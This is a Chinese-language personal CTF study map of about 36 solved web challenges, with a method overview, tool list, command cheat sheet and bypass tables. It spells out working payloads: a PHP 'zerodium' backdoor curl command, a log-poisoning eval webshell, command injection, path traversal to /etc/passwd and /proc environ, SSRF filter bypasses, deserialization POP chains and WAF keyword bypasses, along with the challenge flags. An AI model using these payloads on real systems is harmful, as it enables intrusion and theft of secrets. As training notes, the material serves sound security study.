# 🗺️ Web 入门知识图谱（总览 · 历史版）

> 用途：一眼看全所有题目、工具、命令、方法论。做题前扫一眼定思路，做完回来补节点。
> 更新：2026-08-18 ｜ 已做题 36 道 ｜ 专栏进度：敏感信息✅ RCE基础✅ 文件包含✅ 任意读✅ SQL注入✅ SSRF✅ XSS入门✅ 文件上传✅ 代码执行eval绕过✅ 哈希弱比较✅ 反序列化POP链✅ 写马过滤器绕过✅ 逻辑漏洞✅ HTTP方法✅ 源码泄露后门RCE✅ 弱口令爆破✅ JSON接口鉴权✅

---

## 一、总方法论（所有题通用的"心法"）

```
                    ┌─────────────────────────────────────────┐
                    │            Web 做题心法                   │
                    └─────────────────────────────────────────┘
        ┌──────────────────┬──────────────────┬──────────────────┐
        ▼                  ▼                  ▼                  ▼
   ①信息收集           ②分析               ③利用              ④复盘
   页面/响应头/注释     入口是什么？          选漏洞类型         写WP/更新图谱
   表单/cookie/JS      后端怎么处理输入？    构造请求拿flag
   (技术栈判断)        (黑盒推断→读源码)
```

**核心心法**
1. **数据 vs 代码**：用户输入被当代码/命令执行 = 漏洞根源
2. **黑盒推断 + 读源码验证**：能读文件先读主文件（设计图）
3. **对比实验**：带/不带、存在/不存在，差异即线索
4. **前端校验=纸老虎**：JS 只拦浏览器，拦不住 curl/HackBar
5. **三问法**（组合题卡住时）：目标文件？被什么堵住？有没有侧门？
6. **实测原则**：参考解答也自己验证
7. **工具固化**：每类漏洞沉淀脚本

---

## 二、技术栈识别（认"厨师"）

```
响应头 X-Powered-By: PHP → PHP 题（include/eval/上传...）
响应头 Server: Werkzeug / session=eyJ... → Python Flask（session伪造/SSTI）
纯静态 + nginx/openresty + 目录可列 → 配置漏洞（alias穿越/autoindex）
```

## 三、已完成题目地图（24 题）

```
NSSCTF 题单（11）
├── 敏感信息泄露系列：3861注释 / 3862.git / 3863·3871JS / 3866.swp
├── HTTP/基础：3864 GET-POST / 3865·3873 RCE命令注入
├── 3867 上传+任意读 / 3868 SQL注入
└── 3872 Flask session 伪造（弱密钥爆破）

CTF-Show（2）
├── 嵌套eval（超全局变量链+cookie中文名+嵌套数组）
└── 变量的变量 eval（extract+36层$$链，脚本扫深度）

DASCTF 读文件系列（5）★ 形成"任意文件读取家族"
├── 敏感文件（flag拆分：robots/.DS_Store/bak/swp）
├── Git测试（.git泄露：HEAD验证→git-dumper→仓库搜flag）
├── p参数文件包含（LFI：php://filter读源码→die绕过）
├── u1s1（nginx alias穿越：/img../etc/passwd）
└── N1Page（组合拳：穿越读key→伪造session→SSTI读flag）

DASCTF SQL注入（2）
├── notes（union注入：tips=1看SQL→补引号→order by→union→拖库）★ sqlmap梭哈
└── login（报错注入：extractvalue+concat(0x7e)→select被过滤→sElEcT大小写绕过）

DASCTF SSRF（1）
└── SSRF内网IP绕过（challenge.php源码→内网检查→0x7f000001十六进制绕过→读flag.php）
    ★ 核心原理：解析器不一致（检查gethostbyname/ip2long只认点分十进制，curl认得十六进制）
    ★ 盲打流程：找url参数→验证→经典全家桶→猜flag.php→看回显

DASCTF XSS 七关（6种XSS手法，flag已拿）
└── L1反射XSS / L2~3 JS字符串 / L4 javascript伪协议 / L5表单action / L6 AngularJS模板

DASCTF 文件上传（1）
└── 上传章节练习（show_source白送源码→zip允许→zip-slip穿越webroot + shell.PHP大写绕过.php检查→flag）
    ★ 三弱点叠加：过滤只拦小写.php结尾 / PclZip不防../ / check_dir只扫upload/

qsnctf XSS 十关（反射型XSS+过滤器绕过全解析）★精细笔记
├── L1标签内容直接注入 / L2撬双引号 / L3单引号+事件属性 / L4双引号+事件属性
├── L5 javascript伪协议(独立词过滤漏网) + 执行上下文坑(iframe原生alert不过关)
├── L6 on/src/data/href子串过滤→拦属性名=死结(卡关)
├── L7 双写绕过<scrscriptipt> / L8 href第二反射点+实体救值
├── L9 URL校验用//注释骗过(java&#115;cript:alert(1)//http://a.com)
└── L10 t_sort隐藏入口 + type=text覆盖hidden
    ★ 三条铁律：值能救属性名不能救 / 过滤器看字符串浏览器执行 / 执行上下文决定过关

qsnctf PHP 版本后门（1）★ 新套路
└── PHP 8.1.0-dev zerodium 后门（版本泄露 → User-Agentt 双t头 + zerodium + PHP代码 = RCE root）
    ★ 套路：响应头/页面暴露精确版本号 → 搜「版本+后门/CVE」→ 打已知漏洞
    ★ 命令：curl -H "User-Agentt: zerodiumsystem('cat /flag');" URL

qsnctf 文件上传·MD5碰撞（1）★ 新套路
└── "It is DT's day" 双文件上传：三校验(内容不同 / 是PDF(MIME) / MD5相同) → 全过回显 flag
    ★ 解法：fastcoll 生成 MD5 碰撞对(m1/m2 同MD5不同内容) + curl -F ";type=application/pdf" 伪造MIME
    ★ 教训：MIME(type=)可伪造、MD5判重可碰撞；报错信息=校验规则说明书(黑盒推断)
    ★ flag: flag{38f334ffb26d452e99033ad7fcd4d89d}

qsnctf Login 布尔盲注（1）★ 新工具
└── 登录页布尔盲注：and 1=1 vs and 1=2 响应不同 = oracle
    ★ 解法：自写 sql_blind_extract.py 二分搜ASCII拖库（库qsnctf→表users→列id,username,password→拖出flag）
    ★ 新工具：sql_blind_extract.py（SQL布尔盲注提取引擎，通用模板，sqlmap 装不上时的替代）
    ★ flag: flag{5b6bcba81cb0421192e890b0926b8ab}

qsnctf 登录·加密后门+反序列化POP链（1）★ 新漏洞面
└── 响应不变≠没漏洞：www.zip 源码泄露 → qsnctf.php 多层混淆(urldecode字母表+下标拼函数名+eval(base64)) → php_obf_decode.py 解码 → 明文是 unserialize($username)
    ★ POP链：wo(sex=boy,age=eighteen,intention=shi) → __destruct→inspect→echo触发shi::__toString→next::PLZ(pass)(next=Demo)→__callStatic→$b(pass)=password参数当函数 → system → RCE
    ★ 新工具：php_obf_decode.py（国产CTF混淆模板解码器）
    ★ flag: flag{2a63616a95724195bee4971bebb6ce01}

qsnctf 穿梭隐藏的密钥（1）★ SSRF绕过 + PHP审计三连关
└── c3s4f.php?shell= SSRF，WAF 字符串黑名单拦 127 → localtest.me/sudo.cc（A记录=127.0.0.1 且字符串干净）→ secret.php 给 key=MSIBLG → cha11eng3.php 三连关：
    ├─ ① DrKn=data://text/plain,MSIBLG（data伪协议）→ key1=M_ore.8
    ├─ ② M[ore.8=0e001233333333333334557778889（方括号代替下划线避点转下划线 + md4 0e弱比较）→ wtf/mC
    └─ ③ POST wtf[]=1&mC[]=2（数组：strlen=null过长度、md5=null===null过强比较）→ flag
    ★ 套路：字符串黑名单SSRF用"指向127的干净域名"绕过；测试用例别带黑名单子串(我踩的坑)
    ★ flag(实测): flag{4f4fcf4f5e45430589bcf62ef3b9210d}
qsnctf ping命令注入·分号过滤（1）★ 入门级
└── 源码开卷(highlight_file)：ip 拼进 "ping -c 1 ".$ip，只拦分号 ;
    ★ 解法：; 被拦就换分隔符——?ip=127.0.0.1|cat /flag（管道符秒过）
    ★ 教训：分隔符全家桶(; | || && %0a 反引号 $())漏一个就是口子；与 LitCTF Ping-Ping 同族
    ★ flag(实测): flag{c1231ae0b88f4040bc6bb6426c4f598a}
qsnctf ez_http 六连关（1）★ HTTP 协议基础
└── 提示链：Please use POST → POST带tyctf(开关) → hhh=abc → Referer:https://sqnu-tysec.com → UA:TYsecBrowser → XFF:127.0.0.1 → Cookie:user=admin → flag
    ★ 教训：服务器拿请求头(Referer/UA/XFF/Cookie)当身份依据=全可伪造；XFF 伪造本地 IP 是重灾区
    ★ flag(实测): flag{f58a173f47d847478d1182f1360e6274}
qsnctf Directory Search（1）★ LFI+目录穿越
└── file 参数 LFI，php:// 和 ../ 都被过滤 → 点斜杠变体 ....// 绕过（WAF删一次还剩 ../）
    ★ 解法：?file=....//....//....//....//flag → 直接读根目录 flag
    ★ 教训：../ 被拦换 ....// 、..%2f 、..././ 等"删完还剩"写法；php://filter 被拦就穿越读本体
    ★ flag(实测): flag{dd62da2649e94f5fac16eff08bc06388}
qsnctf Sql Page（1）★ sqlmap 梭哈实战
└── ?id=1 单引号闭合+LIMIT 0,1；sqlmap --technique=BE 7秒出结果：5库(ctf/information_schema/mysql/performance_schema/security)
    ★ 解法：-D ctf --tables → flag 表 → --dump → fake_flag/true_flag 两行，真 flag 在 true_flag
    ★ 教训①：sqlmap 列表输出是 | 表名 | 格式，grep 太严会滤掉表名误判库空(踩过)
    ★ 教训②：fake_flag 陷阱——表里放假的迷惑，选真那条；flag 格式是 SQCTF{} 不是 flag{}
    ★ flag(实测): SQCTF{66a47fc2-cf6e-7648-b523-d29363b5580c}
qsnctf 文件包含大师（1）★ LFI日志包含+蚁剑
└── look 参数 include，拦小写 php/data/filter/input → 大小写 PHP://Filter 绕过读文件 → /flag 不存在 → 日志包含：
    UA 注入 <?php @eval($_POST['x']); ?>（单引号）→ include access.log → 木马执行 → 蚁剑连 → cat /var/www/html/flag.php
    ★ 坑①：木马双引号 → nginx 转义 \x22 → PHP 编译整个日志失败 → 实例报废只能换
    ★ 坑②：curl 里 \$ 是 shell 转义，HackBar/Burp 里带反斜杠 → \x5C → 语法错误
    ★ 坑③：木马别放 URL（<> 被编码）；用 UA/Referer
    ★ flag(实测): flag{10e30ffcd1a343cfbb910c6a84d61ff1}
qsnctf 上传·前端校验绕过（1）★ 入门级
└── 页面 JS 只放 .jpg/.png/.gif（前端校验=纸老虎）→ curl 直接 POST .php 绕过 → 后端完全不拦
    ★ 解法：curl -F "upload_file=@shell.php" → /upload/shell.php?c=命令 → RCE → ls / 找 ffffffllllaaaagg → cat
    ★ 教训：前端校验别当回事，直接传 .php 实测后端；上传成功看回显路径
    ★ flag(实测): flag{3ed4f64a8ea148e986d234db820a0dce}
qsnctf 上传·Content-Type 校验绕过（1）★
└── 「Only Images!」后端 302 拦 .php/.gif：只允许 JPEG/PNG → 对照实验：无图片头 .jpg 也过 = 不查文件头，查 Content-Type
    ★ 解法：curl -F "file=@shell.php;filename=shell.php;type=image/jpeg" → /uploads/shell.php?c=命令 → RCE → cat /flag
    ★ 套路：上传题四类校验(前端JS/Content-Type/扩展名/文件头/MD5)逐个排除；type= 伪造是重灾区
    ★ flag(实测): flag{a642601c1bfd40e097783005b6eeb578}
qsnctf RCE挑战（1）★ 登录爆破 + eval 白名单绕过 + f1ag 陷阱
└── CSS注释泄露用户名 sqctf → 爆破密码 1q2w3e4r → 登录后 ?exp= 被 eval 执行，白名单用 stripos 子串匹配(含 pi/info/popen 任一即放行)
    ★ 解法：payload 前缀带 phpinfo(); 绕过 → eval 执行后面任意代码 → scandir 列 /var/www/html → 5 个 flag 文件，真 flag 在 f1ag.php(数字1伪装l)
    ★ 套路：函数名白名单用子串匹配=白给，前缀白名单词+恶意代码；多 flag 文件逐个读，flag.php 里 SQCTF{fake_flag} 是假的
    ★ flag(实测): flag{9d9b8c8e70e9470182670ecdbcc13339}
qsnctf Flask文档查询（1）★ 任意文件读取 + /proc 环境变量泄露
└── Flask /view?doc= 任意文件读取（realpath join 路径穿越，只拦 /flag 精确匹配）→ 读 app.py 审计 → /proc/self/environ 是 no_FLAG 假线索 → /proc/1/environ 拿真 flag
    ★ 套路：/proc 三板斧(self/environ、1/environ、cmdline)；Docker 里父进程 PID1 环境变量藏真 flag，子进程 FLAG 被改假；SSTI 是干扰项
    ★ flag(实测): flag{21336d08037d41cfb402723d732cb34f}
qsnctf 反序列化-pswd属性构造（1）★ PHP 反序列化
└── 开卷源码：unserialize(filter($_GET['payload']))，条件 pswd=='escaping' → echo $flag；filter 拦 flag/php
    ★ 解法：直接构造 O:4:"test":2:{s:4:"user";s:1:"x";s:4:"pswd";s:8:"escaping";}（不含 flag/php 子串→filter 形同虚设）
    ★ 套路：unserialize 可控→手工构造序列化串（注意长度必须精确）；字符串级黑名单拦不住"本来就不含"的 payload
    ★ flag(实测): flag{d1c6396e6bb541709dfff516bc628df6}
qsnctf TYctf（1）★ PHP 审计三件套
└── extract($_GET) 变量覆盖 + sha1 弱比较(==) + call_user_func 任意函数调用
    ★ 解法：?param1[]=1&param2[]=2（数组→sha1=null→null==null→token=true）→ POST payload=TYctf::getKey → include flag.php → echo $flag
    ★ 套路：extract/parse_str 警觉；哈希==用数组/0e串绕过(===才防)；call_user_func 想调谁调谁
    ★ flag(实测): flag{07614b7fadab487f98bd711b43f02c2d}
qsnctf eval黑名单拼接绕过（1）★ 代码执行/关键字绕过
└── 开卷源码：include("flag.php") + cmd 经双过滤后 eval；黑名单(system/exec/flag/php/cat...) + 必须含 base 才放行
    ★ 解法：'fl'.'ag' + 'p'.'hp' 拼接躲字面量 → file_get_contents 读 flag.php 源码 → //base 注释过第二关
    ★ 套路：WAF 拦"字符串"PHP 认"语义"；关键字用字符串拼接拆开即可过；读文件比依赖变量更稳
    ★ flag(实测): flag{d607e5968bd04134b5039a1957f9538f}
qsnctf MD5弱比较0e魔法哈希（1）★ 哈希弱比较带约束版
└── 开卷源码：flag=getenv('FLAG')；v1必须ctype_alpha(纯字母) + v2必须is_numeric(纯数字) + md5(v1)==md5(v2) 才 echo flag
    ★ 解法：?v1=QNKCDZO&v2=240610708（两个已知 0e 魔法哈希：md5 都以 0e+数字 开头 → == 按科学计数法 0==0 成立）
    ★ 套路：看到哈希比较先分 ==/===；== 用 0e 魔法哈希或数组，=== 只能数组/真碰撞；约束(ctype_alpha/is_numeric)卡死数组 → 只能 0e；常用魔法哈希表：QNKCDZO、240610708、s878926199a、s155964671a
    ★ flag(实测): flag{2dd7aea2e9ca4333b0c83bb634e20aaa}
qsnctf SSRF data://伪造host（1）★ 解析器差异新变体
└── 开卷源码：POST url → filter_var校验 + parse_url的host必须以getflag\.com$结尾 + file_get_contents($url)==='pentest' 才 echo flag
    ★ 解法：url=data://getflag.com/text/plain,pentest（parse_url 把 getflag.com 当 host；data:// 包装器忽略 host 只返回逗号后内容 pentest）
    ★ 套路：同一 URL 被多套解析器(校验器/parse_url/实际抓取)各自解读=找差异；data:// 可伪造任意 host + 指定内容；黑盒时利用 print_r 白送调试
    ★ flag(实测): flag{1fc345b97290432daad3c6168ca27c36}
qsnctf 反序列化变量函数调用RCE（1）★ POP链 + 变量函数落点
└── 开卷：unserialize($_GET['code']) 只拦 flag 关键字；Monitor(status=danger) __destruct 触发 reporter->alert()；Screen::alert() 里 $format($content) 是变量函数调用
    ★ 解法：Monitor(reporter=Screen(format=system, content="cat /f*")) → 对象销毁 → __destruct → system("cat /f*") RCE；通配符 /f* 躲 flag 黑名单
    ★ 套路：unserialize 可控→找魔法方法当触发点(__destruct/__toString/__wakeup)→找变量函数/危险函数当落点→反推对象属性；private 属性序列化键名 \0类名\0属性(URL编码%00，长度要数对)；PHP5 __construct 反序列化不调用、__destruct 调用
    ★ flag(实测): flag{6a831b321e5b4ca88059a885bae58b50}
qsnctf 反序列化POP链-死亡前缀写马（1）★ __toString触发 + php://filter写马
└── 开卷：echo unserialize($_POST['data']) → AuditLog::__toString 调 handler->process()；FileCache::process() 是 file_put_contents 任意文件写(带 <?php exit(); ?> 死亡前缀)；SystemStatus::process() include ./system_config.php
    ★ 解法：链1 AuditLog(handler=FileCache(filePath=php://filter/write=convert.base64-decode/resource=./system_config.php, content=AAA+base64(shell))) 写马；链2 AuditLog(handler=SystemStatus) include 触发 → ?c=cat /flag
    ★ 套路：echo unserialize = 隐性 __toString 触发点；死亡前缀用 base64-decode 过滤器吃掉(忽略非base64字符，前缀变乱码文本)；对齐关键：前缀base64字符33个+补3个A=36(%4==0)否则解码错位污染shell；手写序列化串漏 { 括号=整个false(踩坑)
    ★ flag(实测): flag{1c38ed2dfa0d45f2b6b8b2db9679cbc3}
qsnctf Go+SQLite 联合注入（1）★ 报错泄露 + UNION 列序纪律
└── 黑盒搜索系统：POST /search query 注入 SQLite LIKE '%q%'；单引号报 SQLite 语法错误确认注入；Go 报错(sql: Scan error)泄露列名/类型/表名 flags
    ★ 解法：%' OR 1=1 验证 → UNION 1,2,3 定列数 → sqlite_master 拿表清单+建表语句(列 value) → UNION SELECT 0, value, '' FROM flags
    ★ 套路：SQLite 识别(near xxx syntax error)/Go 识别(Scan error to a int)；UNION 列序：int 列放数字、string 放字符串、NOT NULL 放 ''(NULL 会 Scan error)；建表语句 sql 列=免费 schema，别猜列名
    ★ flag(实测): flag{9f2951b8f2d249c39de126c1cb34d43d}
qsnctf 时间胶囊解锁绕过（1）★ 前端校验=纸老虎/逻辑漏洞
└── 留言板带解封日期；解锁判断在客户端 JS(now>=unlockDate 才 fetch get_content.php?id=N)；服务端接口无鉴权
    ★ 解法：直接循环请求 get_content.php?id=1..9 → id=2(锁到2026-08-28) 返回 FLAG
    ★ 套路：前端控制的"能不能看/能不能点"一律绕前端抓接口；时间锁/倒计时类功能判断在 JS=白给；?id=N 可枚举；隐藏必须在服务端做
    ★ flag(实测): flag{3a8888fd3cc849ecb7d228335e7242c8}
qsnctf preg_replace /e RCE（1）★ 老版本代码注入 + 引号转义绕过
└── 开卷：preg_replace("/(.*)/e","\\1",$_GET['data'])，/e 修饰符把替换串当 PHP eval（PHP7已删，本题5.6）
    ★ 解法：?data=system($_GET[1]);&1=cat /flag（data 无引号躲转义，命令走第二个参数通道）
    ★ 套路：/e=代码注入点当 eval 处理；引号被转义(\)→ payload 保持无引号，用 $_GET[1]/$_POST[1] 通道传参数(assert/eval 类通用)；ls 列表用 head 别 tail 防漏首行
    ★ flag(实测): flag{dfd182e6ea444a1b9eb15e867c7c68ff}
qsnctf HTTP请求方法猜谜（1）★ wrong request method
└── 页面 fetch backend.php(默认GET)；后端校验 HTTP 方法，正确才给 flag；错误有 SESSION 计数+10次后给提示
    ★ 解法：curl -X 逐个试方法全家桶(POST/PUT/PATCH/DELETE/OPTIONS/TRACE/CONNECT/PROPFIND) → POST 直接出 flag
    ★ 套路：见 wrong request method=方法猜谜题；curl -X 切方法+ -b/-c 保持会话；405 拦 TRACE=nginx 层方法分发，线索
    ★ flag(实测): flag{c66edbc33cab4d95a7765b6b097646e1}
qsnctf 源码泄露后门RCE（1）★ www.zip + 噪声文件藏一句话木马
└── 首页给 /www.zip 下载；解压 1002 个随机哈希名 PHP 全是噪声；其中 1 个末尾藏 `array_filter($arr,base64_decode($e))` 后门
    ★ 解法：`e=base64("system")=c3lzdGVt` 走 URL 查询串，`POST=命令` 走 body（-d，别用 -G 否则变 GET 导致空命令）；`cat /flag` 出 flag
    ★ 套路：先扫根目录备份(zip/rar/bak/.git)；噪声混淆里用 grep 搜特征(base64_decode/array_filter/$_REQUEST)定位后门；array_filter(数组,回调) 可隐式执行回调=变体一句话木马
    ★ flag(实测): flag{c468b0f92441432f970aff939afde53f}
qsnctf Flask登录弱口令（1）★ Werkzeug 登录页 admin/123456
└── /login 表单(用户名/密码)；响应头 Server: Werkzeug → Flask；/register 404；SQLi 无效(参数化)
    ★ 解法：弱口令矩阵爆破 → admin/123456 → 302 跳 /dashboard → flag；判据=302/跳转=成功, 200+error=失败
    ★ 套路：登录题先排 注册接口→SQLi→弱口令；CSS 静态文件类名(.flag-box)能剧透登录后有 flag；Flask session 三段式(payload.时间戳.签名)可 base64 解码看内容但改不了
    ★ flag(实测): flag{8a086fc3735548bca68011a873f62d7f}
qsnctf 防火墙登录爆破+接口取flag（1）★ JSON 接口 admin123456 + token 拉威胁日志
└── SPA 登录页(admin 预填, VER 5.8.2)；JS 审计: POST /api/login JSON 成功返 token; /api/threats 需 Bearer
    ★ 解法：爆破(JSON 判据 --ok token) → admin123456 命中 → 带 token 拉 /api/threats → 逐条详情 /api/threats/{id} → WebShell 事件 payload 里 cmd=echo flag{...}(%7B%7D=大括号)
    ★ 套路：弱口令字典有盲区(admin123456 不在 top1000)，补"用户名+数字串/版本号/品牌词"轮；flag 常藏在登录后业务数据(威胁日志 payload)；页面版本号/序列号=口令线索
    ★ flag(实测): flag{cc840204e89f4a35a034f5d075e78cd9}
```

## 四、SSRF 专题

| 手段 | 公式 | 40555 实战 |
|---|---|---|
| 验证 SSRF | 喂 http://example.com 看是否回显三件套 | ✅ |
| **黑名单测绘** | "秒拒 vs 超时"二分：秒拒=被拦，超时=发出去了只是没服务 | ✅ 关键方法 |
| 回环变体 | 127.1 / 2130706433 / 0x7f000001 / [::1] / nip.io | 全灭（解析后查IP） |
| **网关绕过** | 回环被拦 → 用 Docker 网关 `172.17.0.1:端口` 访问服务器自身 | ✅ 突破口 |
| 扫内网 | 172.17.0.x（Docker 默认网段）→ 192.168.x → 10.x | ✅ 发现 172.17.0.2 |
| 伪造 POST | gopher://（若协议放行） | 本环境被拦 |
| **data:// 伪造 host** | `data://<假host>/<mediatype>,<内容>`：parse_url 看到假 host，data 包装器只返回逗号后内容 | ✅ 40745 突破口 |

## 四、任意文件读取家族（重点专题）

| 手段 | 触发点 | 公式 | 题 |
|---|---|---|---|
| 路径穿越 | ?file=参数 | `../../../../etc/passwd` | 3867/N1Page |
| LFI 文件包含 | ?p=参数 | `php://filter/convert.base64-encode/resource=index` | p参数题 |
| nginx alias 穿越 | 映射目录 | `/img../etc/passwd` | u1s1 |
| .git 泄露 | /.git/HEAD | git-dumper + git_search | Git测试 |

**通用流程**：验证(/etc/passwd) → 读主文件源码 → 提取情报（目标/过滤/密钥）→ 找侧门

## 五、工具总表

| 工具 | 用途 | 说明书 |
|---|---|---|
| **sensitive_scan.py** | 敏感文件扫描+robots解析+搜flag+.git自动挖 | ✅ 自写 |
| **combine_scan.py** | 目录扫描+敏感文件 二合一 | ✅ 自写 |
| **git_search.py** | git 仓库自动搜 flag | ✅ 自写 |
| **md5coll/** | fastcoll.exe + 现成碰撞对 m1/m2（MD5碰撞生成，配 `;type=application/pdf` 伪造 MIME） | ✅ 已备 |
| **sql_blind_extract.py** | SQL 布尔盲注提取引擎（二分搜长度+ASCII，通用模板；sqlmap 替代） | ✅ 自写 |
| **php_obf_decode.py** | PHP 混淆解码器（urldecode字母表+下标拼函数名+eval(base64) 模板） | ✅ 自写 |
| mini_scanner.py | 目录扫描（防假200） | ✅ 自写 |
| swp_extract.py | .swp 恢复 | ✅ 自写 |
| php_eval_chain.py | $$链 eval 模板（自动扫深度） | ✅ 自写 |
| php_nested_eval.py | 嵌套eval exploit | ✅ 自写 |
| forge_cookie.py / forge_cookie.py | Flask session 伪造 | ✅ 自写 |
| curl.exe | 发请求万能（万能骨架：怎么发/带什么/怎么收） | ✅ |
| flask-unsign | cookie 解/爆/签 | ✅ |
| git-dumper | .git 下载 | ✅ |
| python+requests/pillow/itsdangerous | 脚本/图片/签名 | ✅ |
| HackBar/Burp | 图形化抓包 | ⬜ 待装 |

## 六、命令速查（核心）

### curl 万能骨架
```
curl.exe 网址 [怎么发] [带什么] [怎么收]
怎么发：-X POST / -d "k=v" / --data-urlencode "k=v"
带什么：-H "头:值" / -b 文件 / -c 文件 / -A UA
怎么收：-o 文件 / -s / -i / -w "%{http_code}" / -v
```

### 读文件家族公式
```bash
# 路径穿越
?file=../../../../etc/passwd
# LFI 读源码
?p=php://filter/convert.base64-encode/resource=index
# alias 穿越
/img../etc/passwd
# /proc 读源码
?name=../../../../proc/self/cwd/server.py
```

### Flask 伪造
```bash
flask-unsign --decode/--unsign --wordlist/--sign --secret
# 或 python forge_cookie.py（itsdangerous）
```

### 无空格命令
```bash
cat</flag / cat${IFS}/flag
```

## 七、已学知识点索引（按笔记）

```
Web笔记01-04：信息泄露/HTTP/目录扫描/RCE速查（早期基础）
Web笔记05：curl+GET/POST+命令注入重点（拼接符/无空格/两层编码）
Web笔记06：PHP 快速入门（超全局变量/危险函数/读题三步法）
Web笔记07：敏感信息泄露 12 种速查
Web笔记08：工具箱手册（工具用法+场景对照）
Web笔记09：Git 泄露解题手册（5动作流程/4藏法）
Web笔记10：LFI 手册（include机制/php://filter/输出链路）
Web笔记11：nginx 基础（root vs alias/穿越/autoindex）
Web笔记12：服务器架构（"服务器"三义/接待员+厨师/一棵树理论/读源码扫雷/三兄弟区分/报错泄露）
Web笔记14：RCE 过滤绕过速查（空格/分隔符/关键字/无回显 + 两个翻车反例 + 靶机用法）
Web笔记15：MD5 碰撞 & 假文件构造（fastcoll/能力边界 + MIME 伪造 + 魔数欺骗 + 上传黑盒推断 + 扩展名无关论）
Web笔记16：HTTP 请求要素速查（四段式结构 + 7个可伪造要素 + POST的&格式 + curl伪造命令）
Web笔记17：sqlmap 核心打法模板（四步下钻：固定前缀 + 4动作表 + 变体 + 踩坑 + 实战案例，配图 svg）
Web笔记18：PHP 伪协议大全（filter读源码/input POST-RCE/data注入/file/phar反序列化/expect + include结合场景表 + allow_url开关）
Web笔记19：Webshell 速查（命令马 system / eval 马 / base64 马 + 前端校验绕过 + 马的选择 CTF vs 实战）
Web笔记20：Burp 上传文件全攻略（multipart 格式三要素 + 拦截改包步骤 + Repeater 模板 + 常见坑）
Web笔记21：文件上传解题手册（五类校验+绕过速查：前端JS/Content-Type/扩展名/文件头/MD5 + .htaccess + 做题流程 + 两题对比）
Web笔记22：PHP 语法零基础速查（8符号/弱比较三绕/危险函数全家桶/call_user_func四形式/payload模板/考点映射）
Web笔记23：Burp 密码爆破全流程（Intruder 六步 + Length 排序认命中 + 信号优先级 + 常见坑 + 字典位置）
Web笔记24：include 与输出机制（include=执行非显示 / 赋值不输出 vs echo显示 / highlight_file 只显示自身源码 + qsnctf40661 实例）
Web笔记25：弱比较与 0e 魔法哈希速查（==/=== 区别、类型转换方向表、0e 科学计数法原理、魔法哈希表、选型决策表、0e假相等 vs fastcoll真碰撞）
Web笔记26：解析器差异与 data:// 伪协议速查（URL 解剖、三套解析器找差异、data:// 伪造 host 套路、失败路径测绘、同类家族、正则结尾/等于读法）
收藏夹：参考题解/教材链接
```

## 八、下一步方向

```
🔵 RCE 进阶层（空格/关键字绕过）—— 2026-08-10 开练：本地靶机 lab_rce_bypass.py + 笔记14（lv0-lv4 已建，套路实测）
🟢 SSTI 专栏（ssti.md）—— N1Page 已预习，下一步候选
🟡 SQLi 加深（盲注/sqlmap）
🟡 XSS 入门
🟡 装 HackBar/Burp
🔴 高级：FastCGI/Redis/反序列化/代码审计（留到后面）
```

---

## 九、RCE 过滤绕过家族（2026-08-10 新增）

> 心法：WAF 拦「字符串」，shell 认「语义」→ 把被拦的字符串变形，语义不变就能过。
> 配套：`web/lab_rce_bypass.py`（5 关，每关只拦一种）+ `web/Web笔记14-RCE过滤绕过速查.md`

| 被拦 | 绕过套路（实测可用） | 翻车（实测不可用） |
|---|---|---|
| 空格 | `cat<f` / `cat${IFS}f` / `ca$@t<f` / Tab(%09) / `{cat,f}` | `c${IFS}at`（变两词） |
| 读文件命令(cat等) | `c""at f` / `c''at f` / `ca$@t f` / 换 more·nl·grep / 文件名通配 `*` | `c\at`（`\a`=响铃，时灵时不灵） |
| 分隔符(; & \|) | `%0a` 换行（`ip%0acat f`）/ `%0d` / 双重编码 `%250a` | — |
| 无回显 | `> out.txt` 重定向落盘，再读该文件 | — |
| 关键字(flag/php等) | 字符串拼接 `'fl'.'ag'` / 可变变量 `$$x` | 直接写被拦词 → HACK!!! |

**通用流程**：确定目标文件 → 列被拦清单 → 逐条对应套路 → 组合题用三问法拆层
